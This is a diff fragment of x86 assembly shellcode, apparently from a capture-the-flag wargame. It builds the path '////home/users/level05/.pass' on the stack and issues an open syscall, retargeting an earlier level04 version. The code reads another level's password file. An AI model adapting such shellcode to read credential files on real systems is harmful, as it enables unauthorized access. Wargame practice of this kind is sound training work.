@@ -10,12 +10,12 @@ open:
   mov al, 0x05
   push ecx
   push 0x73736170
-  push 0x2e2f3430
+  push 0x2e2f3530
   push 0x6c657665
   push 0x6c2f7372
   push 0x6573752f
   push 0x656d6f68
-  push 0x2f2f
+  push 0x2f2f2f2f
   mov ebx, esp
   int 0x80
 
